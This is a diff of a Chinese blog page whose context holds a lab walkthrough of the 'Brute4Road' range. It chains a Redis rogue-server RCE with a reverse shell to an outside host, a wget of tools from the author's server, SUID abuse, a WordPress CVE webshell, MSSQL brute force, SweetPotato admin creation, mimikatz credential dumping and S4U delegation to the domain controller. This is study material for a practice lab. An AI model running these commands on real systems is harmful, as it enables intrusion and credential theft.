@@ -620,19 +620,19 @@
     <article class="post post-detail">
       <div class="post-content">
         <h2 id="春秋云镜-Brute4Road"><a href="#春秋云镜-Brute4Road" class="headerlink" title="春秋云镜 Brute4Road"></a>春秋云镜 Brute4Road</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>fscan扫，为什么我从官网下的fsacn扫了TM一大堆开放端口出来？</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912190917828.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912190917828.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250912190917828"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912190917828.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912190917828.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>不管了直接打redis了</p>
 <p>redis-cli -h ip</p>
 <p>连上之后，可以尝试config set写一下计划任务，不过是没权限的</p>
 <p><code>INFO replication</code>判断当前环境，role:master和#Replication，判断为当前为主从复制环境，且当前为主节点。从节点是role:slaves</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912200344553.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912200344553.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250912200344553"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912200344553.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912200344553.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>INFO server，查看一下redis版本</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912200621612.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912200621612.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250912200621612"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912200621612.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912200621612.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>5.0.12，redis 好像4.x和5.x都是能打主从复制rce的，<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./redis-rogue-server.py --rhost 39.99.226.56 --lhost 117.72.74.197 --lport 50050</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意这里不是nc监听的端口，而是任意一个空端口，后面会要求输入reverse ip port，那个才是监听端口</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912203811434.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912203811434.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250912203811434"></p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912203818753.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912203818753.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250912203818753"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912203811434.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912203811434.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912203818753.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912203818753.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>whoami一下，看到是redis权限</p>
 <p>转交互式shell：python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
 <p>提权，别用sudo -l，要输入自己的密码，到时候一断环境就崩了</p>
@@ -641,21 +641,21 @@
 </blockquote>
 <p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p>
 <p>查找设置了SUID权限的可执行文件，看到有base64</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103442036.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103442036.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014103442036"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103442036.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103442036.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>GTFObins显示base64 SUID可以任意文件读</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103526136.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103526136.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014103526136"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103526136.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103526136.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>find &#x2F; -name flag找到在&#x2F;home&#x2F;redis&#x2F;flag下有flag01，但是没权限读，刚好用base64读</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103621569.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103621569.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014103621569"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103621569.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103621569.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>base64 “&#x2F;home&#x2F;redis&#x2F;flag&#x2F;flag01” | base64 –decode</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103842886.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103842886.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014103842886"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103842886.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103842886.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>flag01: flag{66b43ff4-5736-4cd7-9df5-f4af6cd248d0}</p>
 <h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>靶机为centos系统，但是ifconfig和ip addr都不能用，用netstat -an查看网段</p>
 <p>可以知道本机为172.22.2.7，网段也就推测为172.22.2.7&#x2F;24（话说春秋云镜从没遇到过跨C段的说）</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014104232684.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014104232684.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014104232684"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014104232684.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014104232684.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>尝试直接wget官网的fscan，好像，访问不了github？某种不可言的网络策略吧，从自己服务器下吧</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">python -m SimpleHTTPServer 8888</span><br><span class="line"># python 2.7</span><br><span class="line">wget http://117.72.74.197:8888/fscan</span><br><span class="line">chmod 777 fscan</span><br><span class="line">./fscan -h 172.22.2.7/24</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014110750517.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014110750517.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014110750517"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014110750517.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014110750517.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">172.22.2.34 XIAORANG域用户</span><br><span class="line">172.22.2.16 winServer 2016 MySQLServer</span><br><span class="line">172.22.2.3 winServer 2016 DC域控</span><br><span class="line">172.22.2.18 存在匿名ftp 且为WordPress站</span><br><span class="line">172.22.2.7 本机</span><br></pre></td></tr></table></figure>
 
 <p>上传gost，代理出来</p>
@@ -669,49 +669,49 @@
 <p>WordPress version 6.0 identified (Insecure, released on 2022-05-24).得知有洞，用<a target="_blank" rel="noopener" href="https://github.com/biulove0x/CVE-2021-25003">https://github.com/biulove0x/CVE-2021-25003</a></p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python WpCargo.py -t http://172.22.2.18/</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120336758.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120336758.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014120336758"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120336758.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120336758.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>看下脚本逻辑，shell路径位于wp-content&#x2F;wp-conf.php?1&#x3D;system，密码为2，连接类型为CMDLINUX</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120521312.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120521312.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014120521312"></p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120805334.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120805334.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014120805334"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120521312.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120521312.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120805334.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120805334.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>网站根目录wp-config.php下找到数据库账号密码wpuser&#x2F;WpuserEha8Fgj9</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120952764.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120952764.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014120952764"></p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014121131304.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014121131304.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014121131304"></p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014121200675.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014121200675.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014121200675"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120952764.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120952764.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014121131304.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014121131304.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014121200675.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014121200675.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>flag{c757e423-eb44-459c-9c63-7625009910d8}</p>
 <h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>这下面还有奇怪的密码表</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014121240345.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014121240345.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014121240345"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014121240345.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014121240345.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>拿去爆破MSSQLSERVER 172.22.2.16</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 172.22.2.16 -m mssql -pwdf passwd.txt</span><br></pre></td></tr></table></figure>
 
 <p>不知道为什么我的fscan又又又又没扫出来，哦原来导出，蚁剑给我limit默认了20条，得把limit去掉得到全部字典</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014122715642.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014122715642.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014122715642"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014122715642.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014122715642.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sa ElGNkOiC</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014122021148.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014122021148.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014122021148"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014122021148.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014122021148.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>进来先激活xpcmdshell和另外一个组件</p>
 <p>执行就是system域用户</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014123131903.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014123131903.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014123131903"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014123131903.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014123131903.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>创建管理员用户方便操作</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a &quot;net user godown qwer1234 /add&quot;</span><br><span class="line">C:/Users/Public/SweetPotato.exe -a &quot;net localgroup administrators godown /add&quot;</span><br></pre></td></tr></table></figure>
 
 <p>tmd 账密test&#x2F;123456一连接说是密码过期了，得上linux rdesktop改下密码，但这不是我刚加的用户吗，重新创建了一个密码复杂一点的就登上了</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014123837731.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014123837731.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014123837731"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014123837731.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014123837731.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>flag03: flag{ae9d7830-0bbc-4a88-91e6-5f2b36b47aca}</p>
 <h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>传mimikatz上去，回到MDUT那个域用户，dump hash，记住一定要在域用户上抓hash而不是自己设置的工作组adminstrator</p>
 <p>先尝试dcsync抓域控hash，报错没有dcsync权限</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a &quot;C:/Users/godown/Desktop/mimikatz.exe \&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv\&quot; exit&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014124733748.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014124733748.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014124733748"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014124733748.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014124733748.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>再从内存抓hash，从内存抓hash就不用在域用户上抓了，都能访问内存，不过为了方便还是直接甜土豆把</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a <span class="string">&quot;C:/Users/godown/Desktop/mimikatz.exe privilege::debug sekurlsa::logonpasswords exit&quot;</span></span><br></pre></td></tr></table></figure>
 
 <p>找到一个用户，还在DC上，不过这逼密码过期了</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014125703911.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014125703911.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014125703911"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014125703911.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014125703911.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>还有一堆MSSQLSERVER$xx用户，找一个Domain在XIAORANG上的MSSQLSERVER用户</p>
 <p>833b7fd6cd241c433efffde59363dbcf</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014130259887.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014130259887.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014130259887"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014130259887.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014130259887.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>上SharpHound收集一波，也是MDUT甜土豆执行</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a <span class="string">&quot;C:/Users/godown/Desktop/SharpHound.exe -c all&quot;</span></span><br></pre></td></tr></table></figure>
 
@@ -730,7 +730,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py DC.xiaorang.lab -k -no-pass -dc-ip 172.22.2.3</span><br></pre></td></tr></table></figure>
 
 <p>也可以直接读type \DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014133636689.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014133636689.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014133636689"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014133636689.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014133636689.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>flag04: flag{70da6fee-a107-440a-b6cb-8e56a69f0ed1}</p>
 <h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><h4 id="蚁剑CMDLINUX是什么？"><a href="#蚁剑CMDLINUX是什么？" class="headerlink" title="蚁剑CMDLINUX是什么？"></a>蚁剑CMDLINUX是什么？</h4><p>这个需要分析一下WpCargo注入的shell</p>
 <p>脚本通过&#x2F;wp-content&#x2F;plugins&#x2F;wpcargo&#x2F;includes&#x2F;barcode.php上传了一个二进制文件</p>
@@ -749,9 +749,9 @@
 <p>如果攻击者控制了一个服务账户，服务账户配置了到 <code>CIFS</code> 服务的约束性委派，就能打Rebeus s4u，只不过刚好CIFS就是LDAP域控，打出的TGT票据就能直接拿下域控</p>
 <p>S4U2Self 允许：服务可以为<strong>任何用户</strong>请求访问<strong>自己</strong>的服务票据</p>
 <p>正常的S4U2Self请求如下</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014154017378.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014154017378.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014154017378"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014154017378.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014154017378.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>利用S4U2Proxy去代理服务</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014154045134.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014154045134.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20251014154045134"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014154045134.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014154045134.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>也就是利用S4U2Self获取ST，然后到处乱用这个ST，这个ST能请求其他服务的</p>
 <p>如果我们有一个配置了约束性委派的服务账户，并且该账户被允许委派到域控制器的LDAP服务，那么我们可以通过S4U2Self和S4U2Proxy获取域控制器LDAP服务的ST。然后，利用LDAP服务的ST，可以获取到黄金票据TGT。</p>
 <p>因此，整个攻击过程需要：</p>
@@ -1104,6 +1104,27 @@ Thinkphp工具一把
             
 
             <div class="post-img-box">
+              <a href="/2026/10/18/yi-xie-qi-guai-de-zi-shi-he-chang-jing-za-hui/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8197.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8197.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">10-18</span>
+                
+              </div>
+              <a class="post-title" href="/2026/10/18/yi-xie-qi-guai-de-zi-shi-he-chang-jing-za-hui/">一些奇怪的姿势和场景杂烩</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
               <a href="/2026/05/01/rhino-fan-xu-lie-hua/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
                 <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8196.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8196.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
